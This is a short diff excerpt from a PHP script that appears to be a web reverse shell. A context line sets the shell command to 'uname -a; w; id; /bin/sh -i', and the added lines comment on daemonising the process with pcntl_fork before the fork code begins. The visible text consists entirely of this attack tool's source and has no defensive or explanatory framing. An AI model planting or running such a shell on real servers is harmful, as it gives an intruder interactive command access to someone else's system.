@@ -13,6 +13,12 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
+
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
 if (function_exists('pcntl_fork')) {
 	// Fork and have the parent process exit
 	$pid = pcntl_fork();
